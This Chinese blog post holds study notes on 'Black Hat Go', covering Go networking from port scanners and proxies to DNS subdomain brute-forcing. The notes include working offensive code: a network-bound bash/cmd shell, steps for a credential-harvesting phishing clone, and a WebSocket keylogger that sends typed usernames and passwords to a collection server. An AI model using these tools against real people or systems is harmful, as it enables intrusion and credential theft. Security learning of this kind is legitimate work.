---
title: 《Black Hat Go》学习笔记(一)
date: 2021-07-27 19:33:01
categories:
  - Summary
---



中文翻译版：<https://github.com/YYRise/black-hat-go>

# TCP、扫描器和代理

## TCP扫描程序

### 单个端口扫描

通过`net.Dial(network, address)`来连接一个地址的特定端口（`network`参数支持TCP、UDP、IP以及Unix Socket）

```go
conn, err := net.Dial("tcp", "scanme.nmap.org:80")
if err != nil{
    return
}
```

<!-- more -->

### 使用goroutine实现并发扫描

#### 信号量+循环

信号量使用`sync.WaitGroup`实现

```go
var wg sync.WaitGroup
for i := 1; i <= 1024; i++ {
    wg.Add(1)
    go func(j int) {
        defer wg.Done()
        address := fmt.Sprintf("scanme.nmap.org:%d", j) 
        conn, err := net.Dial("tcp", address)
        if err != nil {
            return 
        }
        conn.Close()
        fmt.Printf("%d open\n", j)
    }(i)
}
wg.Wait() 
```

由于goroutine过多可能导致结果的不确定性，改进为工作池模式（生产者-消费者），通过一个指定大小的`channel`传输端口数据

```go
func worker(ports chan int, wg *sync.WaitGroup) {
    for p := range ports {
        // net.Dial...
        wg.Done() 
    }
}
func main() {
    ports := make(chan int, 100) 
    var wg sync.WaitGroup
    for i := 0; i < cap(ports); i++ { 
        go worker(ports, &wg)
    }
    for i := 1; i <= 1024; i++ {
        wg.Add(1) 
        ports <- i
    }
    wg.Wait()
    close(ports)
}
```

## TCP代理

Golang中使用`io.Reader`和`io.Writer`来进行数据的传输和读写，这两个类型是接口，需要实现对应的方法：

```go
type Reader interface {
    Read(p []byte) (n int, err error)
}
type Writer interface {
    Write(p []byte) (n int, err error)
}
```

任意类型只要实现了这两个方法即可被视为Reader或Writer。

通过byte slice可以让数据在不同的Reader和Writer中流转，为了方便这一操作，使用`io.Copy(dst io.Writer, src io.Reader)`可以快速的让数据在Reader和Writer之间复制。

### Echo服务器的实现

```go
func echo(conn net.Conn) {
    defer conn.Close()

    b := make([]byte, 512)
    for {
        size, err := conn.Read(b)
        if err == io.EOF {
            log.Println("Client disconnected")
            break 
        }
        if err != nil {
            log.Println("Unexpected error")
            break
        }
        log.Printf("Received %d bytes: %s\n", size, string(b))

        log.Println("Writing data")
        if _, err := conn.Write(b); err != nil {
            log.Fatalln("Unable to write data")
        }
    } 
}
func main() {
    // Bind
    listener, err := net.Listen("tcp", ":20080")
    if err != nil {
        log.Fatalln("Unable to bind to port")
    }
    log.Println("Listening on 0.0.0.0:20080")
    for {
        // Accept
        conn, err := listener.Accept()
        log.Println("Received connection")
        if err != nil {
            log.Fatalln("Unable to accept connection")
        }
		// Process data
        go echo(conn)
    }
}
```

上述代码启动了一个TCP服务器，并且数据的处理是直接调用了连接的底层Reader和Writer实现，由于没有缓冲，实际运行只能每次读一个字节：

```
2021/07/27 20:08:21 Listening on 0.0.0.0:20080
2021/07/27 20:08:32 Received connection
2021/07/27 20:08:36 Received 1 bytes: v
2021/07/27 20:08:36 Writing data
2021/07/27 20:08:36 Received 1 bytes: d
2021/07/27 20:08:36 Writing data
2021/07/27 20:08:36 Received 1 bytes: v
2021/07/27 20:08:36 Writing data
2021/07/27 20:08:36 Received 1 bytes: d
2021/07/27 20:08:36 Writing data
2021/07/27 20:08:36 Received 1 bytes: v
2021/07/27 20:08:36 Writing data
```

改进：使用`bufio`包创建带缓冲的IO读写类型

```go
reader := bufio.NewReader(conn)
s, err := reader.ReadString('\n')
if err != nil {
    log.Fatalln("Unable to read data")
}
log.Printf("Read %d bytes: %s", len(s), s)

log.Println("Writing data") 
writer := bufio.NewWriter(conn)
if _, err := writer.WriteString(s); err != nil { 
    log.Fatalln("Unable to write data")
}
writer.Flush()
```

再改进：直接使用`io.Copy()`

```go
func echo(conn net.Conn) {
    defer conn.Close()
    if _, err := io.Copy(conn, conn); err != nil {
        log.Fatalln("Unable to read/write data")
    }
}
```

### TCP端口转发器

实现和Echo基本一致，通过`net.Dial()`创建去往目标地址的连接`dst`，然后使用`io.Copy()`把来自客户端的数据`src`转发到`dst`，并把来自服务器的数据转发回`src`。避免阻塞，双向数据传输过程分别使用goroutine启动

```go
func handle(src net.Conn) {
    dst, err := net.Dial("tcp", address)
    if err != nil {
        log.Fatalln("Unable to connect to our unreachable host")
    }
    defer dst.Close()

    go func() {
        if _, err := io.Copy(dst, src); err != nil {
            log.Fatalln(err)
        }
    }()

    if _, err := io.Copy(src, dst); err != nil {
        log.Fatalln(err)
    }
}

func main(){
    // Listen, Accept...
    go handle(conn)
}
```

### 正向Shell、反向Shell的实现

通过`os/exec`中的`exec.Command()`可以创建一个`Cmd`实例，然后将该`Cmd`实例的`Stdin`和`Stdout`赋值为对应的TCP连接即可

```go
func handle(conn net.Conn){
	defer conn.Close()

	cmd := exec.Command("/bin/bash", "-i")

	cmd.Stdin = conn
	cmd.Stdout = conn

	err := cmd.Run()
	if err != nil {
		return 
	}
}
```

由于Windows对匿名管道的特殊处理，上述代码收不到命令的输出，有两个办法解决：

- 自定义Writer类型，实现`Write`方法，在输出数据的时候同时Flush输出（内部包一个`bufio`的Writer）

  ```go
  type Flusher struct {
      w *bufio.Writer
  }
  
  func NewFlusher(w io.Writer) *Flusher {
      return &Flusher{ w: bufio.NewWriter(w), }
  }
  
  func (foo *Flusher) Write(b []byte) (int, error) {
      count, err := foo.w.Write(b)
      // handle errors...
      err := foo.w.Flush()
      // handle errors...
      return count, err
  }
  ```

- 使用`io.Pipe()`将输出导入至管道，再通过管道输出到连接

  ```go
  cmd := exec.Command("cmd.exe")
  reader, writer := io.Pipe()
  cmd.Stdin = conn
  cmd.Stdout = writer
  go io.Copy(conn, reader)
  cmd.Run()
  ```

# HTTP客户端和使用工具远程交互

Go使用`net/http`包来进行HTTP的操作。可以直接调用方法来进行`GET`、`POST`、`HEAD`请求

```go
http.Get(url string) (resp *Response, err error)
http.Head(url string) (resp *Response, err error)
http.Post(url string, bodyType string, body io.Reader) (resp *Response, err error)
http.PostForm(url string data url.Values) (resp *Response, err error)
```

其他类型的请求统一使用`http.NewRequest()`

```go
request, _ := http.NewRequest("GET", "https://baidu.com/robots.txt", nil)
var client http.Client
do, _ := client.Do(request)
```

为HTTP请求添加代理，需要设置`http.Client`的`Transport`：

```go
client.Transport = &http.Transport{
    Proxy: func (_ * http.Request) (*url.URL, error) {
        return url.Parse("http://127.0.0.1:9999")
    },
}
```

对于一些返回JSON的HTTP响应，可以使用`encoding/json`包来处理数据，需要提前构建对应的结构体，转换网站：[Go JSON解析](https://www.sojson.com/json/json2go.html)

## Metasploit RPC交互

其实就是简单的HTTP请求和结果解析，唯一不一样的是Metasploit采用了二进制的MessageBlock作为传输的数据结构，需要对数据进行编码和解码。

有关Metasploit的所有RPC操作在官网都有：[Standard API Methods Reference | Metasploit Documentation](https://docs.rapid7.com/metasploit/standard-api-methods-reference/)

对MessageBlock操作需要用到包msgpack：<https://pkg.go.dev/github.com/vmihailenco/msgpack>

## 网络爬虫

对于网页的解析，Go同样有很方便的包可用：[PuerkitoBio/goquery](https://github.com/PuerkitoBio/goquery)

对于搜索节点的方法，搜索模式的表达是从根节点开始一层一层向下，不同层级的节点标识用空格隔开，如下所示：

```go
pattern := "html body div#b_content main ol#b_results li.b_algo h2 a"
// html > body > div#b_content > main > ol#b_results > li.b_algo > h2 > a
```

当然还有其他的操作方法了，基本上BeautifulSoup有的goquery也都有，还是很强大的

下面的程序抓取Bing搜索引擎结果的链接并打印：

```go
package main

import (
    "fmt"
    "github.com/PuerkitoBio/goquery"
    "net/http"
    "net/url"
)

func main()  {
    link := "https://cn.bing.com/search?q=%s"
    query := "golang"
    var client http.Client

    req, _ := http.NewRequest("GET", fmt.Sprintf(link, url.QueryEscape(query)), nil)
    req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0")
    req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Add("Upgrade-Insecure-Requests", "1")
    req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0")
    req.Header.Add("Accept-Encoding", "gzip, deflate, br")
    req.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
    req.Header.Add("Connection", "keep-alive")

    resp, _ := client.Do(req)

    doc, _ := goquery.NewDocumentFromReader(resp.Body)
    pattern := "html body div#b_content main ol#b_results li.b_algo h2 a"
    doc.Find(pattern).Each(func(i int, selection *goquery.Selection) {
        link, exists := selection.Attr("href")
        if exists {
            fmt.Println(link)
        }
    })
}
```

输出：

```
https://golang.google.cn/
https://studygolang.com/
http://c.biancheng.net/golang/
https://golang.org/dl/
...
```

# HTTP服务器、路由和中间件

Go同样通过`net/http`包来实现HTTP的服务器操作。下面是一个最简单的单路由HTTP服务器

```go
package main

import (
    "fmt"
    "net/http"
)

func main() {
    http.HandleFunc("/hello", func(writer http.ResponseWriter, request *http.Request) {
		fmt.Fprintf(w, "Hello %s\n", r.URL.Query().Get("name"))
	})
    http.ListenAndServe(":8000", nil)
}
```

`http.HandleFunc()`方法用于为指定的路由添加处理函数，第一个参数为路径，第二个参数为一个固定参数的函数。这个方法没有指定`http.Handler`实例进行处理，所以采用的是Go默认创建的底层多路复用器`DefaultServerMux`进行处理。处理函数的原型如下：

```go
func(writer http.ResponseWriter, request *http.Request) {}
```

`http.ListenAndServe()`指定服务器监听的地址和端口数据，并且指定处理HTTP请求的`http.Handler`实例，如指定为`nil`则交由`DefaultServerMux`进行处理。

若需自定义路由，只需在自定义结构体里面实现`http.Handler`的`ServeHTTP`方法即可，然后传给`http.ListenAndServe()`的第二个参数。

```go
type router struct {}
func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {}
```

也可以使用成熟的第三方包`github.com/gorilla/mux`来构建路由，其对路由的匹配模式更加灵活

```go
r := mux.NewRouter()   // Create a new router

// 在HandleFunc方法后面添加更多限定条件，如Host、Method
r.HandleFunc("/foo", func(w http.ResponseWriter, req *http.Request) {
    fmt.Fprint(w, "hi foo")
}).Methods("GET").Host("www.foo.com")

// 自定义路径匹配，支持正则表达式
r.HandleFunc("/users/{user}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")

r.HandleFunc("/users/{user:[a-z]+}", func(w http.ResponseWriter, req *http.Request) {
    user := mux.Vars(req)["user"]
    fmt.Fprintf(w, "hi %s\n", user)
}).Methods("GET")

// 为指定的路径前缀采用处理器
r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
```

## 构建自定义中间件

中间件即为在匹配到真正处理HTTP请求函数前执行的一些函数，如身份验证、log记录等功能

如果不采用第三方包可以通过多重Handler来实现，即在一个Handler中调用另一个Handler，这样链式的调用最终到达真正的处理函数。

同样可以采用成熟的第三方包`github.com/urfave/negroni`来构建中间件。通常可以将negroni和mux一起使用，即通过negroni创建一个中间件，中间件处理后的请求交由mux进行路由、处理等操作。`negroni.NewClassic()`方法可以创建一个带有一些默认方法的中间件。

```go
func main() {
    r := mux.NewRouter()
    n := negroni.NewClassic()
    
    n.UseHandler(r)
    log.Fatal(http.ListenAndServe(":8000", n))
}
```

同样可以创建自己的中间件，需要实现`negroni.Handler`接口，即实现`ServeHTTP()`方法。由于其调用参数与`http.Handler`不一致，所以通用性上没有直接使用`UseHandler()`方法好。

```go
type MyMiddleWare struct {}
// 第三个参数即为下一个要调用的函数
func (m *MyMiddleWare) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
    // Process Code
    next(w, r)
}
n.Use(&MyMiddleWare{})
```

## HTML模板

使用`html/template`可以创建HTML模板。对应的还有普通的文本模板`text/template`

在模板中使用`{ {.} }`进行全上下文的变量替换`.`后面添加变量名进行局部替换（需传入结构体）

```go
t, _ := template.New("test").Parse()  // Parse a string
t, _ := template.ParseFiles()  // Parse a file
t.Execute(io.Writer, interface{})
```

## 钓鱼网站构建

1. 使用浏览器下载完整网站源码
2. 将登录页面的Form Action修改为本地路径
3. 对路径启用专门的记录函数，用于收集凭证
4. 根目录以文件服务器形式启用，用于加载Web静态数据

```go
r := mux.NewRouter()
r.HandleFunc("/login", login).Methods("POST")
r.PathPrefix("/").Handler(http.FileServer(http.Dir("web")))
log.Fatal(http.ListenAndServe(":8080", r))
```

## WebSocket Keylogger

通过WebSocket协议来记录键盘

JavaScript：

```javascript
var conn = new WebSocket("ws://{{.}}/ws");
var username = document.querySelector("#u");
var password = document.querySelector("#p");

username.onkeypress = function (evt) {
    s = String.fromCharCode(evt.which);
    conn.send("Username: "+s);
};
password.onkeypress = function (evt) {
    s = String.fromCharCode(evt.which);
    conn.send("Password: "+s);
};
```

Go：

```go
package main

import (
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"html/template"
	"log"
	"net/http"
)

var (
	upgrader websocket.Upgrader
	jsTemplate *template.Template
	wsAddr string
)

func wsHandler(writer http.ResponseWriter, request *http.Request){
	conn, err := upgrader.Upgrade(writer, request, nil)
	if err != nil {
		http.Error(writer, err.Error(), 500)
		return
	}
	defer conn.Close()

	log.Printf("Connection from %s", conn.RemoteAddr().String())
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		log.Printf("From %s: %s", conn.RemoteAddr().String(), string(msg))
	}
	log.Printf("Connection Closed: %s", conn.RemoteAddr().String())
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", func(writer http.ResponseWriter, request *http.Request) {
		_ = jsTemplate.Execute(writer, wsAddr)
	})
	r.HandleFunc("/ws", wsHandler)
	log.Fatal(http.ListenAndServe(":23333", r))
}
```

WebSocket实现使用了第三方包`gorilla/websocket`，使用websocket.Upgrader方法创建Upgrader实例，通过调用upgrader.Upgrade将HTTP请求升级为WebSocket，然后进行后续操作。下面是输出：

```
2021/08/01 17:36:52 From 127.0.0.1:10990: Username: a
2021/08/01 17:36:52 From 127.0.0.1:10990: Username: d
2021/08/01 17:36:52 From 127.0.0.1:10990: Username: m
2021/08/01 17:36:52 From 127.0.0.1:10990: Username: i
2021/08/01 17:36:52 From 127.0.0.1:10990: Username: n
2021/08/01 17:36:54 From 127.0.0.1:10990: Password: 1
2021/08/01 17:36:55 From 127.0.0.1:10990: Password: 2
2021/08/01 17:36:55 From 127.0.0.1:10990: Password: 3
2021/08/01 17:36:55 From 127.0.0.1:10990: Password: 4
2021/08/01 17:36:55 From 127.0.0.1:10990: Password: 5
2021/08/01 17:36:55 From 127.0.0.1:10990: Password: 6
```

## 多路复用C2

基于反向代理来实现C2服务器的多路复用，原理就是通过设定Host头来标识要去往的C2服务器地址，然后Go程序内维护一个Host:C2的键值对数组用于存储这些信息，再实现反向代理即可。

Go很方便的一点在于官方的`net/http/httputil`包里面已经实现了有关反向代理的函数`httputil.NewSingleHostReverseProxy()`，无需自己实现只需直接调用即可。

# DNS利用

Go里面的`net`包提供了大多数DNS操作的功能，如查看A、CNAME、NS、MX以及反向查询，但缺点在于可自定义性不强，无法指定DNS服务器而是直接使用系统的配置，返回结果也不够详细。下面是一些DNS查询方法：

```go
net.LookupAddr("ip")
net.LookupIP("example.com")
net.LookupCNAME("example.com")
```

为了规避这些缺点，使用高度模块化的第三方包`github.com/miekg/dns`来进行DNS的查询以及DNS服务的搭建。

## 进行DNS查询并处理响应

包使用结构体`dns.Msg`来承载DNS请求/响应数据，其具体结构如下：

```go
type Msg struct {
    MsgHdr
    Compress bool       `json:"-"` // If true, the message will be compressed when converted to wire format.
    Question []Question // Holds the RR(s) of the question section.
    Answer   []RR       // Holds the RR(s) of the answer section.
    Ns       []RR       // Holds the RR(s) of the authority section.
    Extra    []RR       // Holds the RR(s) of the additional section.
}
```

1. 通过`dns.Fqdn()`将输入的域名转换为FQDN格式的字符串
2. 使用`dns.SetQuestion(fqdn, type)`设置`dns.Msg`里的Question字段，第二个参数指定查询类型
3. 使用`dns.Exchange(*msg, serverAddr)`进行DNS查询，返回值也是`*dns.Msg`
4. 读取返回值的Answer字段，获取响应数据

```go
package main

import (
	"fmt"
	"github.com/miekg/dns"
)

func main()  {
	var msg dns.Msg
	fqdn := dns.Fqdn("baidu.com")
	msg.SetQuestion(fqdn, dns.TypeA)
	res, err := dns.Exchange(&msg, "114.114.114.114:53")
	if err != nil {
		return
	}
	if len(res.Answer) > 1 {
		for _, r := range res.Answer {
			if a, ok := r.(*dns.A); ok {
				fmt.Println(a.A.String())
			}
		}
	}
}

// Output
// 220.181.38.251
// 220.181.38.148
```

上面的程序查询baidu.com的A记录，在输出结果的时候使用了Go的类型断言，意思是仅在记录类型为`*dns.A`时才输出结果，类型断言介绍：[go类型断言](https://studygolang.com/articles/3133)

## 子域名爆破程序

进行子域名爆破，即基于一个子域的字典对指定域名进行DNS记录查询，并且返回所有有效的数据。这个过程中主要查询的是域名的A记录和CNAME记录，对于一个域名而言，如果它有CNAME记录，说明这个域名是另一个域名的别名，所以应当继续对查询结果再次进行CNAME查询，直到无法查询到CNAME记录为止；如果它没有CNAME记录将查询其A记录，如果存在A记录则返回IP地址，不存在则忽略。

基于上面的思路进行关键代码的构建：

```go
type Result struct {
	Hostname  string
	IPAddress string
}

func lookupRecords(fqdn, serverAddr string, recordType uint16) ([]string, error) {
	var msg dns.Msg
	var result []string
	msg.SetQuestion(dns.Fqdn(fqdn), recordType)
	exchange, err := dns.Exchange(&msg, serverAddr)
	if err != nil {
		return result, err
	}
	for _, ans := range exchange.Answer {
		if recordType == dns.TypeA {
			if a, ok := ans.(*dns.A); ok {
				result = append(result, a.A.String())
			}
		}
		if recordType == dns.TypeCNAME {
			if cname, ok := ans.(*dns.CNAME); ok {
				result = append(result, cname.Target)
			}
		}
	}
	return result, nil
}

func lookup(fqdn, serverAddr string) ([]Result, error) {
	var results []Result
	var tmpFqdn = fqdn
	for {
		cnames, err := lookupRecords(tmpFqdn, serverAddr, dns.TypeCNAME)
		if err != nil {
			return results, err
		}
		if len(cnames) > 0 {
			tmpFqdn = cnames[0]
			continue
		}
		as, err := lookupRecords(tmpFqdn, serverAddr, dns.TypeA)
		if err != nil {
			break
		}
		for _, a := range as {
			results = append(results, Result{Hostname: fqdn, IPAddress: a})
		}
		break
	}
	return results, nil
}
```

对于查询CNAME的时候为什么只取结果的第一个我一开始是很迷惑的，后面查了一下，CNAME只可能是一对一的关系，一般不存在一对多的关系，具体描述：[Can we have multiple CNAMES for a single Name?](https://serverfault.com/questions/574072/can-we-have-multiple-cnames-for-a-single-name)

接下来进行并发以及工作池的实现。原理和之前的TCP扫描器差不多，使用两个Channel，一个用于传递域名数据，另一个用于传递结果，使用一个空结构体的Channel来传递线程工作完成的信息。其实传递线程工作完成也可以使用信号量来实现，原理上都是一样的。

```go
type Empty struct {}

func DomainWorker(domains chan string, gather chan []Result, tracker chan Empty, serverAddr string) {
	for domain := range domains {
		log.Printf("FQDN %s started", domain)
		result, err := lookup(domain, serverAddr)
		if err != nil {
			log.Println(fmt.Sprintf("Error for %s: %s", domain, err))
		}
		if len(result) > 0 {
			gather <- result
		}
	}
	var e Empty
	tracker <- e
}
```

主函数中的处理逻辑：

```go
// 读取字典
scanner := bufio.NewScanner(domainFile)
// 创建线程池
for i := 0; i < *cliWorkerPool; i++ {
    go DomainWorker(domains, gather, tracker, *cliServeraddr)
}
// 输入域名数据
for scanner.Scan() {
    domains <- fmt.Sprintf("%s.%s", scanner.Text(), *cliDomainName)
}
// 起一个新线程来读取结果
go func() {
    for res := range gather {
        results = append(results, res...)
    }
    var e Empty
    tracker <- e
}()
// 关闭domains Channel，使得worker函数跳出循环
close(domains)
// 接受线程结束信号
for i := 0; i < *cliWorkerPool; i++ {
    <-tracker
}
// 所有工作线程均结束，关闭结果收集的Channel
close(gather)
// 接收其结束信号
<-tracker
// 输出结果
......
```

在写多线程的时候发现一个需要注意的点：在等待工作线程结束的时候一定要先关闭对应的Channel，否则所有Worker线程都阻塞在那个死循环里面无法结束，两者的顺序一定不能错。

最后加一个命令行参数的解析，采用的是`flag`包：

```go
var (
    cliDomainName = flag.String("domain", "", "Domain Name")
    cliServeraddr = flag.String("server", "114.114.114.114:53", "DNS Server")
    cliWorkerPool = flag.Int("worker", 5, "Worker Pool Count")
    cliDomainList = flag.String("wordlist", `subnames.txt`, "Word List")
)
flag.Parse()
```

## 简单的DNS服务搭建

使用`dns.HandleFunc(pattern, func)`可以实现自定义的DNS处理逻辑，然后使用`dns.ListenAndServe(":53", "udp", nil)`开始监听53端口。当然这是最简单的实现方法，同样可以自己写Handler来实现。

下面是一个简单的Local DNS Server（没有做错误处理，报错会退出）

```go
dns.HandleFunc(".", func(writer dns.ResponseWriter, msg *dns.Msg) {
    resp := dns.Msg{}
    tmp := dns.Msg{}
    resp.SetReply(msg)
    switch msg.Question[0].Qtype {
        case dns.TypeA:
        resp.Authoritative = true
        domain := msg.Question[0].Name

        tmp.SetQuestion(domain, dns.TypeA)
        res, _ := dns.Exchange(&tmp, "192.168.1.1:53")
        for _, a := range res.Answer {
            if aa, ok := a.(*dns.A); ok {
                resp.Answer = append(
                    resp.Answer,
                    &dns.A{
                        Hdr: dns.RR_Header{Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 10},
                        A: aa.A,
                    },
                )
            }
        }
        writer.WriteMsg(&resp)
    }
})
log.Fatal(dns.ListenAndServe(":53", "udp", nil))
```
